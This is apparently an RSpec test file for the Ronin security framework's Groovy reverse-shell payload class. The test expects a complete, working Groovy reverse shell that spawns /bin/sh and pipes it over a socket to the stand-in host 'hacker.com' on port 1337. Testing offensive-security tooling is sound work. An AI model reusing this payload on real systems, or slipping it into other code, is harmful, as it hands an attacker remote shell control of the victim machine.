require 'spec_helper'
require 'ronin/payloads/builtin/groovy/reverse_shell'

describe Ronin::Payloads::Groovy::ReverseShell do
  it "must inherit from Ronin::Payloads::GroovyPayload" do
    expect(described_class).to be < Ronin::Payloads::GroovyPayload
  end

  describe ".id" do
    subject { described_class }

    it "must equal 'groovy/reverse_shell'" do
      expect(subject.id).to eq('groovy/reverse_shell')
    end
  end

  let(:host) { 'hacker.com' }
  let(:port) { 1337 }

  subject do
    described_class.new(
      params: {
        host: host,
        port: port
      }
    )
  end

  describe "#build" do
    before { subject.build }

    it "must build a Groovy script that connects back to the host and port params" do
      expect(subject.payload).to eq(
        %{Process p=new ProcessBuilder("/bin/sh").redirectErrorStream(true).start();Socket s=new Socket(#{host.inspect},#{port});InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();}
      )
    end
  end
end
